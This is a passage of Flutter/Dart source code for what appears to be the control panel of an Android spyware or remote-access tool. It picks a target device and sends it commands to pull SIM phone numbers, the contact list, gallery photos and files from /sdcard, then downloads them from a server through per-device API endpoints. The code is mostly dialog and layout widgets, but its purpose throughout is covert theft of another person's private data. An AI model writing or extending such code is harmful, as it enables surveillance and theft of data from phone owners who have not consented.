                                          borderRadius: BorderRadius.circular(10),
                                          border: Border.all(
                                            color: const Color(0xFF34D399).withOpacity(0.2),
                                          ),
                                        ),
                                        child: const Icon(
                                          Icons.sim_card,
                                          color: Color(0xFF34D399),
                                          size: 20,
                                        ),
                                      ),
                                      const SizedBox(width: 12),
                                      Expanded(
                                        child: Column(
                                          crossAxisAlignment: CrossAxisAlignment.start,
                                          children: [
                                            Text(
                                              displayName,
                                              style: TextStyle(
                                                color: _t0,
                                                fontSize: 13,
                                                fontWeight: FontWeight.w600,
                                              ),
                                            ),
                                            const SizedBox(height: 2),
                                            Text(
                                              operatorName,
                                              style: TextStyle(
                                                color: _t2,
                                                fontSize: 11,
                                              ),
                                            ),
                                            const SizedBox(height: 2),
                                            Text(
                                              number,
                                              style: TextStyle(
                                                color: _green,
                                                fontSize: 12,
                                                fontWeight: FontWeight.w500,
                                              ),
                                            ),
                                          ],
                                        ),
                                      ),
                                      if (number != 'Tidak tersedia')
                                        GestureDetector(
                                          onTap: () {
                                            _copyText(number);
                                            ScaffoldMessenger.of(context).showSnackBar(
                                              SnackBar(
                                                content: Text("📱 Copied: $number", style: TextStyle(color: _t0)),
                                                backgroundColor: _b3,
                                              ),
                                            );
                                          },
                                          child: Container(
                                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                                            decoration: BoxDecoration(
                                              color: _blue2.withOpacity(0.1),
                                              borderRadius: BorderRadius.circular(6),
                                              border: Border.all(
                                                color: _blue2.withOpacity(0.2),
                                              ),
                                            ),
                                            child: Text(
                                              "COPY",
                                              style: TextStyle(
                                                color: _blue2,
                                                fontSize: 10,
                                                fontWeight: FontWeight.bold,
                                              ),
                                            ),
                                          ),
                                        ),
                                    ],
                                  ),
                                );
                              }).toList(),
                            ],
                          ),
                        ),
            ),
            actions: [
              TextButton(
                onPressed: () {
                  Navigator.pop(context);
                },
                child: Text(
                  "TUTUP",
                  style: TextStyle(color: _t2, fontWeight: FontWeight.bold),
                ),
              ),
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [_blue2, _blue3],
                  ),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: ElevatedButton.icon(
                  onPressed: () {
                    setState(() {
                      _isPhoneLoading = true;
                      _phoneData = {};
                    });
                    setDialogState(() {});
                    _sendCommand('getPhone');
                    _addLog("🔄 Refreshing phone info", LogType.info);
                  },
                  icon: const Icon(Icons.refresh, size: 16, color: Colors.white),
                  label: const Text("REFRESH", style: TextStyle(color: Colors.white)),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.transparent,
                    shadowColor: Colors.transparent,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10),
                    ),
                  ),
                ),
              ),
            ],
          );
        },
      ),
    );
  }

  // ─── SHOW CONTACTS DIALOG ────────────────────────────────────────────
  void _showContactsDialog() {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Pilih device terlebih dahulu!", LogType.error);
      return;
    }

    setState(() {
      _isContactsLoading = true;
      _contactsList = [];
      _filteredContacts = [];
      _appSearchController.clear();
    });

    _sendCommand('getContacts');
    _addLog("📇 Fetching contacts...", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          return AlertDialog(
            backgroundColor: _b3,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(20),
              side: BorderSide(color: _gborder2),
            ),
            titlePadding: const EdgeInsets.all(16),
            contentPadding: const EdgeInsets.all(0),
            title: Row(
              children: [
                Container(
                  width: 36,
                  height: 36,
                  decoration: BoxDecoration(
                    color: _amber.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: _amber.withOpacity(0.3)),
                  ),
                  child: const Icon(Icons.contacts, color: Colors.amber, size: 20),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        "Contacts",
                        style: TextStyle(
                          color: _t0,
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      Text(
                        "${_contactsList.length} contacts",
                        style: TextStyle(
                          color: _t2,
                          fontSize: 11,
                        ),
                      ),
                    ],
                  ),
                ),
                IconButton(
                  icon: Icon(Icons.close, color: _t2, size: 20),
                  onPressed: () {
                    Navigator.pop(context);
                  },
                ),
              ],
            ),
            content: Container(
              width: double.maxFinite,
              height: 450,
              child: Column(
                children: [
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                    child: TextField(
                      controller: _appSearchController,
                      style: TextStyle(color: _t0, fontSize: 13),
                      decoration: InputDecoration(
                        hintText: "Cari kontak...",
                        hintStyle: TextStyle(color: _t2, fontSize: 13),
                        prefixIcon: Icon(Icons.search, color: _t2, size: 20),
                        contentPadding: const EdgeInsets.symmetric(horizontal: 4, vertical: 10),
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(12),
                          borderSide: BorderSide(color: _blue2.withOpacity(0.1)),
                        ),
                        enabledBorder: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(12),
                          borderSide: BorderSide(color: _blue2.withOpacity(0.1)),
                        ),
                        focusedBorder: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(12),
                          borderSide: BorderSide(color: _blue2, width: 1.5),
                        ),
                        filled: true,
                        fillColor: _b2,
                      ),
                      onChanged: (value) {
                        setDialogState(() {
                          if (value.isEmpty) {
                            _filteredContacts = List.from(_contactsList);
                          } else {
                            final query = value.toLowerCase();
                            _filteredContacts = _contactsList.where((contact) {
                              final name = (contact['name'] ?? '').toLowerCase();
                              final number = (contact['number'] ?? '').toLowerCase();
                              return name.contains(query) || number.contains(query);
                            }).toList();
                          }
                        });
                      },
                    ),
                  ),
                  
                  Expanded(
                    child: _isContactsLoading
                        ? Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                SizedBox(
                                  width: 30,
                                  height: 30,
                                  child: CircularProgressIndicator(
                                    color: _blue2,
                                    strokeWidth: 2,
                                  ),
                                ),
                                const SizedBox(height: 12),
                                Text(
                                  "Loading contacts...",
                                  style: TextStyle(color: _t2, fontSize: 12),
                                ),
                              ],
                            ),
                          )
                        : _filteredContacts.isEmpty
                            ? Center(
                                child: Text(
                                  _appSearchController.text.isEmpty
                                      ? "No contacts found"
                                      : "Contact not found",
                                  style: TextStyle(color: _t2, fontSize: 13),
                                ),
                              )
                            : ListView.builder(
                                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                itemCount: _filteredContacts.length > 100 ? 100 : _filteredContacts.length,
                                itemBuilder: (context, index) {
                                  final contact = _filteredContacts[index];
                                  final name = contact['name']?.toString() ?? 'Unknown';
                                  final number = contact['number']?.toString() ?? '';

                                  return Container(
                                    margin: const EdgeInsets.only(bottom: 4),
                                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                                    decoration: BoxDecoration(
                                      color: _b2,
                                      borderRadius: BorderRadius.circular(10),
                                      border: Border.all(
                                        color: _blue2.withOpacity(0.05),
                                      ),
                                    ),
                                    child: Row(
                                      children: [
                                        Container(
                                          width: 36,
                                          height: 36,
                                          decoration: BoxDecoration(
                                            color: _amber.withOpacity(0.1),
                                            borderRadius: BorderRadius.circular(8),
                                            border: Border.all(
                                              color: _amber.withOpacity(0.2),
                                            ),
                                          ),
                                          child: Center(
                                            child: Text(
                                              name.isNotEmpty ? name[0].toUpperCase() : '?',
                                              style: const TextStyle(
                                                color: Colors.amber,
                                                fontSize: 14,
                                                fontWeight: FontWeight.bold,
                                              ),
                                            ),
                                          ),
                                        ),
                                        const SizedBox(width: 12),
                                        Expanded(
                                          child: Column(
                                            crossAxisAlignment: CrossAxisAlignment.start,
                                            children: [
                                              Text(
                                                name,
                                                style: TextStyle(
                                                  color: _t0,
                                                  fontSize: 13,
                                                  fontWeight: FontWeight.w500,
                                                ),
                                                maxLines: 1,
                                                overflow: TextOverflow.ellipsis,
                                              ),
                                              Text(
                                                number,
                                                style: TextStyle(
                                                  color: _t2,
                                                  fontSize: 11,
                                                ),
                                                maxLines: 1,
                                                overflow: TextOverflow.ellipsis,
                                              ),
                                            ],
                                          ),
                                        ),
                                        GestureDetector(
                                          onTap: () {
                                            _copyText(number);
                                            ScaffoldMessenger.of(context).showSnackBar(
                                              SnackBar(
                                                content: Text("📇 Copied: $number", style: TextStyle(color: _t0)),
                                                backgroundColor: _b3,
                                              ),
                                            );
                                          },
                                          child: Container(
                                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                                            decoration: BoxDecoration(
                                              color: _blue2.withOpacity(0.1),
                                              borderRadius: BorderRadius.circular(6),
                                              border: Border.all(
                                                color: _blue2.withOpacity(0.2),
                                              ),
                                            ),
                                            child: Text(
                                              "COPY",
                                              style: TextStyle(
                                                color: _blue2,
                                                fontSize: 10,
                                                fontWeight: FontWeight.bold,
                                              ),
                                            ),
                                          ),
                                        ),
                                      ],
                                    ),
                                  );
                                },
                              ),
                  ),
                ],
              ),
            ),
            actions: [
              TextButton(
                onPressed: () {
                  Navigator.pop(context);
                },
                child: Text(
                  "CLOSE",
                  style: TextStyle(color: _t2, fontWeight: FontWeight.bold),
                ),
              ),
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [_blue2, _blue3],
                  ),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: ElevatedButton.icon(
                  onPressed: () {
                    setState(() {
                      _isContactsLoading = true;
                    });
                    setDialogState(() {});
                    _sendCommand('getContacts');
                    _addLog("🔄 Refreshing contacts", LogType.info);
                  },
                  icon: const Icon(Icons.refresh, size: 16, color: Colors.white),
                  label: const Text("REFRESH", style: TextStyle(color: Colors.white)),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.transparent,
                    shadowColor: Colors.transparent,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10),
                    ),
                  ),
                ),
              ),
            ],
          );
        },
      ),
    );
  }

  // ─── GALLERY FULLSCREEN ──────────────────────────────────────────────
  void _openGalleryFullscreen() {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Pilih device terlebih dahulu!", LogType.error);
      return;
    }

    setState(() {
      _galleryModalVisible = true;
      _isGalleryLoading = true;
      _galleryPhotos = [];
    });

    _sendCommand('getGallery');
    _addLog("🖼️ Opening gallery...", LogType.info);
    _fetchGalleryViaHttp();
  }

  Future<void> _fetchGalleryViaHttp() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      
      final response = await http.get(
        Uri.parse("$baseUrl/api/gallery/$_targetId"),
        headers: {"x-auth-token": token},
      );
      
      if (response.statusCode == 200 && mounted) {
        final data = jsonDecode(response.body);
        final photos = data['photos'] as List? ?? [];
        
        setState(() {
          _galleryPhotos = photos.map((p) => Map<String, dynamic>.from(p)).toList();
          _isGalleryLoading = false;
          _galleryModalVisible = true;
        });
        
        _addLog("🖼️ Gallery loaded: ${_galleryPhotos.length} photos", LogType.success);
        
        if (_galleryPhotos.isNotEmpty) {
          _showGalleryDialog();
        } else {
          _addLog("📷 No photos found", LogType.warning);
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text("Tidak ada foto di gallery", style: TextStyle(color: _t0)),
              backgroundColor: _b3,
            ),
          );
          setState(() {
            _galleryModalVisible = false;
          });
        }
      } else {
        _addLog("❌ Gallery HTTP failed: ${response.statusCode}", LogType.error);
        setState(() {
          _isGalleryLoading = false;
          _galleryModalVisible = false;
        });
      }
    } catch (e) {
      _addLog("⚠️ Gallery HTTP error: $e", LogType.error);
      if (mounted) {
        setState(() {
          _isGalleryLoading = false;
          _galleryModalVisible = false;
        });
      }
    }
  }

  void _showGalleryDialog() {
    if (_galleryPhotos.isEmpty) {
      _addLog("📷 No photos found", LogType.warning);
      return;
    }

    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.95),
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          return Dialog(
            backgroundColor: Colors.transparent,
            insetPadding: const EdgeInsets.all(4),
            child: Container(
              width: double.infinity,
              height: double.infinity,
              decoration: BoxDecoration(
                color: _b0,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: _blue2.withOpacity(0.1)),
              ),
              child: Stack(
                children: [
                  if (_isGalleryLoading)
                    Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          SizedBox(
                            width: 40,
                            height: 40,
                            child: CircularProgressIndicator(
                              color: _blue2,
                              strokeWidth: 3,
                            ),
                          ),
                          const SizedBox(height: 16),
                          Text(
                            "LOADING GALLERY...",
                            style: TextStyle(
                              color: _t2,
                              fontSize: 12,
                              letterSpacing: 2,
                            ),
                          ),
                        ],
                      ),
                    )
                  else if (_galleryPhotos.isEmpty)
                    Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(Icons.photo_library_outlined, color: _t2, size: 64),
                          const SizedBox(height: 16),
                          Text(
                            "Tidak ada foto",
                            style: TextStyle(color: _t2, fontSize: 14),
                          ),
                        ],
                      ),
                    )
                  else
                    GridView.builder(
                      padding: const EdgeInsets.all(8),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 3,
                        crossAxisSpacing: 6,
                        mainAxisSpacing: 6,
                        childAspectRatio: 1,
                      ),
                      itemCount: _galleryPhotos.length > 100 ? 100 : _galleryPhotos.length,
                      itemBuilder: (context, index) {
                        final photo = _galleryPhotos[index];
                        final thumb = photo['thumb'] ?? '';
                        final name = photo['name'] ?? 'photo_$index';
                        return GestureDetector(
                          onTap: () {
                            _showGalleryPhotoDetail(index, setDialogState);
                          },
                          child: Container(
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(10),
                              color: _b2,
                              border: Border.all(color: _blue2.withOpacity(0.1)),
                            ),
                            child: ClipRRect(
                              borderRadius: BorderRadius.circular(10),
                              child: thumb.isNotEmpty
                                  ? Image.memory(
                                      base64Decode(thumb.contains(',') ? thumb.split(',').last : thumb),
                                      fit: BoxFit.cover,
                                      errorBuilder: (context, error, stackTrace) {
                                        return Container(
                                          color: _b2,
                                          child: Icon(Icons.broken_image, color: _t2, size: 30),
                                        );
                                      },
                                    )
                                  : Container(
                                      color: _b2,
                                      child: Icon(Icons.image_not_supported, color: _t2, size: 30),
                                    ),
                            ),
                          ),
                        );
                      },
                    ),

                  Positioned(
                    top: 0,
                    left: 0,
                    right: 0,
                    child: Container(
                      padding: const EdgeInsets.fromLTRB(20, 20, 20, 12),
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          begin: Alignment.topCenter,
                          end: Alignment.bottomCenter,
                          colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                        ),
                      ),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Row(
                            children: [
                              Container(
                                width: 10,
                                height: 10,
                                decoration: BoxDecoration(
                                  color: _blue2,
                                  shape: BoxShape.circle,
                                ),
                              ),
                              const SizedBox(width: 10),
                              Text(
                                "GALLERY",
                                style: TextStyle(
                                  color: _t0,
                                  fontSize: 14,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 2,
                                ),
                              ),
                              const SizedBox(width: 12),
                              Text(
                                "${_galleryPhotos.length > 100 ? '100' : _galleryPhotos.length} / ${_galleryPhotos.length}",
                                style: TextStyle(
                                  color: _t2,
                                  fontSize: 10,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                          Text(
                            _targetModel,
                            style: TextStyle(
                              color: _t2,
                              fontSize: 10,
                              letterSpacing: 1,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),

                  Positioned(
                    top: 20,
                    right: 20,
                    child: GestureDetector(
                      onTap: () {
                        Navigator.pop(context);
                        setState(() {
                          _galleryModalVisible = false;
                          _galleryPhotos = [];
                        });
                      },
                      child: Container(
                        width: 40,
                        height: 40,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: _b2,
                          border: Border.all(color: _blue2.withOpacity(0.1)),
                        ),
                        child: Icon(
                          Icons.close,
                          color: _t0,
                          size: 20,
                        ),
                      ),
                    ),
                  ),

                  Positioned(
                    top: 20,
                    left: 120,
                    child: GestureDetector(
                      onTap: () {
                        setState(() {
                          _isGalleryLoading = true;
                          _galleryPhotos = [];
                        });
                        _sendCommand('getGallery');
                        _addLog("🔄 Refreshing gallery", LogType.info);
                        _fetchGalleryViaHttp();
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          color: _b2,
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: _blue2.withOpacity(0.1)),
                        ),
                        child: Row(
                          children: [
                            Icon(Icons.refresh, color: _t2, size: 16),
                            const SizedBox(width: 4),
                            Text(
                              "REFRESH",
                              style: TextStyle(
                                color: _t2,
                                fontSize: 10,
                                letterSpacing: 1,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }

  void _showGalleryPhotoDetail(int index, StateSetter setDialogState) {
    final photo = _galleryPhotos[index];
    final fullImage = photo['thumb'] ?? '';
    final name = photo['name'] ?? 'photo_$index';

    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.95),
      builder: (context) => StatefulBuilder(
        builder: (context, setState) {
          return Dialog(
            backgroundColor: Colors.transparent,
            insetPadding: const EdgeInsets.all(4),
            child: Container(
              width: double.infinity,
              height: double.infinity,
              color: Colors.black,
              child: Stack(
                children: [
                  Center(
                    child: InteractiveViewer(
                      minScale: 0.5,
                      maxScale: 4.0,
                      panEnabled: true,
                      scaleEnabled: true,
                      child: fullImage.isNotEmpty
                          ? Image.memory(
                              base64Decode(fullImage.contains(',') ? fullImage.split(',').last : fullImage),
                              fit: BoxFit.contain,
                              width: MediaQuery.of(context).size.width * 0.95,
                              height: MediaQuery.of(context).size.height * 0.75,
                              errorBuilder: (context, error, stackTrace) {
                                return Container(
                                  color: _b2,
                                  child: Center(
                                    child: Text(
                                      "Error loading image",
                                      style: TextStyle(color: _t2),
                                    ),
                                  ),
                                );
                              },
                            )
                          : Container(
                              color: _b2,
                              child: Center(
                                child: Text(
                                  "Image not available",
                                  style: TextStyle(color: _t2),
                                ),
                              ),
                            ),
                    ),
                  ),
                  Positioned(
                    top: 20,
                    right: 20,
                    child: GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        width: 40,
                        height: 40,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: _b2,
                          border: Border.all(color: _blue2.withOpacity(0.1)),
                        ),
                        child: Icon(
                          Icons.close,
                          color: _t0,
                          size: 20,
                        ),
                      ),
                    ),
                  ),
                  Positioned(
                    bottom: 80,
                    left: 0,
                    right: 0,
                    child: Center(
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
                        decoration: BoxDecoration(
                          color: _b2.withOpacity(0.8),
                          borderRadius: BorderRadius.circular(20),
                        ),
                        child: Text(
                          "${index + 1} / ${_galleryPhotos.length > 100 ? 100 : _galleryPhotos.length}",
                          style: TextStyle(
                            color: _t2,
                            fontSize: 12,
                            letterSpacing: 1,
                          ),
                        ),
                      ),
                    ),
                  ),
                  Positioned(
                    bottom: 20,
                    left: 0,
                    right: 0,
                    child: Center(
                      child: Container(
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: [_blue2, _blue2.withOpacity(0.5)],
                          ),
                          borderRadius: BorderRadius.circular(25),
                        ),
                        child: ElevatedButton.icon(
                          onPressed: () {
                            _downloadScreenshot(fullImage);
                            ScaffoldMessenger.of(context).showSnackBar(
                              SnackBar(
                                content: Text("📥 Downloading...", style: TextStyle(color: _t0)),
                                backgroundColor: Colors.black,
                              ),
                            );
                          },
                          icon: const Icon(Icons.download, size: 18, color: Colors.white),
                          label: const Text("DOWNLOAD", style: TextStyle(color: Colors.white)),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.transparent,
                            shadowColor: Colors.transparent,
                            padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(25),
                            ),
                          ),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }

  // ─── FILE MANAGER ──────────────────────────────────────────────────────
  void _openFileManager() {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Pilih device terlebih dahulu!", LogType.error);
      return;
    }

    setState(() {
      _fileManagerModalVisible = true;
      _isFileManagerLoading = true;
      _fileList = [];
      _currentPath = '/sdcard';
      _pathStack = [];
    });

    _sendCommand('getFiles', extra: '/sdcard');
    _addLog("📁 Opening file manager...", LogType.info);
  }

  void _showFileManagerDialog() {
    if (_fileList.isEmpty && !_isFileManagerLoading) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text("Tidak ada file di direktori ini", style: TextStyle(color: _t0)),
          backgroundColor: _b3,
        ),
      );
      setState(() {
        _fileManagerModalVisible = false;
      });
      return;
    }

    if (_isFileManagerLoading) {
      _addLog("📁 Loading files...", LogType.info);
    }

    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.95),
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          return Dialog(
            backgroundColor: Colors.transparent,
            insetPadding: const EdgeInsets.all(4),
            child: Container(
              width: double.infinity,
              height: double.infinity,
              decoration: BoxDecoration(
                color: _b0,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: _blue2.withOpacity(0.1)),
              ),
              child: Stack(
                children: [
                  Column(
                    children: [
                      Container(
                        padding: const EdgeInsets.fromLTRB(20, 20, 16, 12),
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            begin: Alignment.topCenter,
                            end: Alignment.bottomCenter,
                            colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                          ),
                        ),
                        child: Row(
                          children: [
                            Container(
                              width: 10,
                              height: 10,
                              decoration: BoxDecoration(
                                color: Colors.orange,
                                shape: BoxShape.circle,
                              ),
                            ),
                            const SizedBox(width: 10),
                            Text(
                              "FILE MANAGER",
                              style: TextStyle(
                                color: _t0,
                                fontSize: 14,
                                fontWeight: FontWeight.bold,
                                letterSpacing: 2,
                              ),
                            ),
                            const SizedBox(width: 12),
                            Expanded(
                              child: Text(
                                _currentPath,
                                style: TextStyle(
                                  color: _t2,
                                  fontSize: 10,
                                  letterSpacing: 0.5,
                                ),
                                overflow: TextOverflow.ellipsis,
                              ),
                            ),
                            GestureDetector(
                              onTap: () {
                                setState(() {
                                  _isFileManagerLoading = true;
                                  _fileList = [];
                                });
                                _sendCommand('getFiles', extra: _currentPath);
                                _addLog("🔄 Refreshing files", LogType.info);
                                setDialogState(() {});
                              },
                              child: Container(
                                padding: const EdgeInsets.all(6),
                                decoration: BoxDecoration(
                                  color: _b2,
                                  borderRadius: BorderRadius.circular(8),
                                  border: Border.all(color: _blue2.withOpacity(0.1)),
                                ),
                                child: Icon(Icons.refresh, color: _t2, size: 16),
                              ),
                            ),
                          ],
                        ),
                      ),

                      if (_pathStack.isNotEmpty)
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                          child: Row(
                            children: [
                              GestureDetector(
                                onTap: () {
                                  _navigateBack();
                                  setDialogState(() {});
                                },
                                child: Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                                  decoration: BoxDecoration(
                                    color: _b2,
                                    borderRadius: BorderRadius.circular(8),
                                    border: Border.all(color: _blue2.withOpacity(0.1)),
                                  ),
                                  child: Row(
                                    children: [
                                      Icon(Icons.arrow_back, color: _blue2, size: 16),
                                      const SizedBox(width: 4),
                                      Text(
                                        "BACK",
                                        style: TextStyle(
                                          color: _blue2,
                                          fontSize: 10,
                                          fontWeight: FontWeight.bold,
                                          letterSpacing: 1,
                                        ),
                                      ),
                                    ],
                                  ),
                                ),
                              ),
                              const SizedBox(width: 8),
                              Expanded(
                                child: Text(
                                  _currentPath,
                                  style: TextStyle(
                                    color: _t2,
                                    fontSize: 10,
                                    letterSpacing: 0.5,
                                  ),
                                  overflow: TextOverflow.ellipsis,
                                ),
                              ),
                            ],
                          ),
                        ),

                      Expanded(
                        child: _isFileManagerLoading
                            ? Center(
                                child: Column(
                                  mainAxisSize: MainAxisSize.min,
                                  children: [
                                    SizedBox(
                                      width: 40,
                                      height: 40,
                                      child: CircularProgressIndicator(
                                        color: _blue2,
                                        strokeWidth: 3,
                                      ),
                                    ),
                                    const SizedBox(height: 16),
                                    Text(
                                      "LOADING FILES...",
                                      style: TextStyle(
                                        color: _t2,
                                        fontSize: 12,
                                        letterSpacing: 2,
                                      ),
                                    ),
                                  ],
                                ),
                              )
                            : _fileList.isEmpty
                                ? Center(
                                    child: Column(
                                      mainAxisSize: MainAxisSize.min,
                                      children: [
                                        Icon(Icons.folder_open, color: _t2, size: 64),
                                        const SizedBox(height: 16),
                                        Text(
                                          "Direktori kosong",
                                          style: TextStyle(color: _t2, fontSize: 14),
                                        ),
                                      ],
                                    ),
                                  )
                                : ListView.builder(
                                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                    itemCount: _fileList.length,
                                    itemBuilder: (context, index) {
                                      final file = _fileList[index];
                                      final isDir = file['isDir'] ?? false;
                                      final name = file['name'] ?? 'unknown';
                                      final size = file['size'] ?? 0;
                                      final path = file['path'] ?? '';

                                      return Container(
                                        margin: const EdgeInsets.only(bottom: 4),
                                        decoration: BoxDecoration(
                                          color: isDir ? _b2.withOpacity(0.3) : _b2,
                                          borderRadius: BorderRadius.circular(10),
                                          border: Border.all(
                                            color: _blue2.withOpacity(0.05),
                                          ),
                                        ),
                                        child: ListTile(
                                          contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                                          leading: Container(
                                            width: 36,
                                            height: 36,
                                            decoration: BoxDecoration(
                                              color: isDir ? Colors.orange.withOpacity(0.1) : _blue2.withOpacity(0.05),
                                              borderRadius: BorderRadius.circular(8),
                                              border: Border.all(
                                                color: isDir ? Colors.orange.withOpacity(0.2) : _blue2.withOpacity(0.05),
                                              ),
                                            ),
                                            child: Icon(
                                              isDir ? Icons.folder : Icons.insert_drive_file,
                                              color: isDir ? Colors.orange : _t2,
                                              size: 20,
                                            ),
                                          ),
                                          title: Text(
                                            name,
                                            style: TextStyle(
                                              color: _t0,
                                              fontSize: 13,
                                              fontWeight: isDir ? FontWeight.w600 : FontWeight.normal,
                                            ),
                                            maxLines: 1,
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                          subtitle: isDir
                                              ? null
                                              : Text(
                                                  _formatFileSize(size),
                                                  style: TextStyle(
                                                    color: _t2,
                                                    fontSize: 10,
                                                  ),
                                                ),
                                          trailing: isDir
                                              ? Icon(Icons.chevron_right, color: _t2, size: 20)
                                              : GestureDetector(
                                                  onTap: () {
                                                    _downloadFile(path, name);
                                                  },
                                                  child: Container(
                                                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                                                    decoration: BoxDecoration(
                                                      color: _blue2.withOpacity(0.1),
                                                      borderRadius: BorderRadius.circular(6),
                                                      border: Border.all(
                                                        color: _blue2.withOpacity(0.2),
                                                      ),
                                                    ),
                                                    child: Text(
                                                      "DOWNLOAD",
                                                      style: TextStyle(
                                                        color: _blue2,
                                                        fontSize: 9,
                                                        fontWeight: FontWeight.bold,
                                                        letterSpacing: 0.5,
                                                      ),
                                                    ),
                                                  ),
                                                ),
                                          onTap: () {
                                            if (isDir) {
                                              _navigateToDirectory(path);
                                              setDialogState(() {});
                                            }
                                          },
                                        ),
                                      );
                                    },
                                  ),
                      ),
                    ],
                  ),

                  Positioned(
                    top: 20,
                    right: 20,
                    child: GestureDetector(
                      onTap: () {
                        Navigator.pop(context);
                        setState(() {
                          _fileManagerModalVisible = false;
                          _fileList = [];
                        });
                      },
                      child: Container(
                        width: 40,
                        height: 40,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: _b2,
                          border: Border.all(color: _blue2.withOpacity(0.1)),
                        ),
                        child: Icon(
                          Icons.close,
                          color: _t0,
                          size: 20,
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }

  void _navigateToDirectory(String path) {
    setState(() {
      _pathStack.add(_currentPath);
      _currentPath = path;
      _isFileManagerLoading = true;
      _fileList = [];
    });
    _sendCommand('getFiles', extra: path);
    _addLog("📁 Navigating to: $path", LogType.info);
  }

  void _navigateBack() {
    if (_pathStack.isEmpty) return;
    setState(() {
      _currentPath = _pathStack.removeLast();
      _isFileManagerLoading = true;
      _fileList = [];
    });
    _sendCommand('getFiles', extra: _currentPath);
    _addLog("📁 Going back to: $_currentPath", LogType.info);
  }

  Future<void> _downloadFile(String path, String name) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      
      final response = await http.get(
        Uri.parse("$baseUrl/api/file/$_targetId?path=$path"),
        headers: {"x-auth-token": token},
      );

      if (response.statusCode == 200) {
        final bytes = response.bodyBytes;
        final directory = await getDownloadsDirectory() ?? await getApplicationDocumentsDirectory();
        final file = File('${directory.path}/$name');
        await file.writeAsBytes(bytes);
        _addLog("✅ File downloaded: $name", LogType.success);
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("📥 Downloaded: $name", style: TextStyle(color: _t0)),
            backgroundColor: _b3,
          ),
        );
      } else {
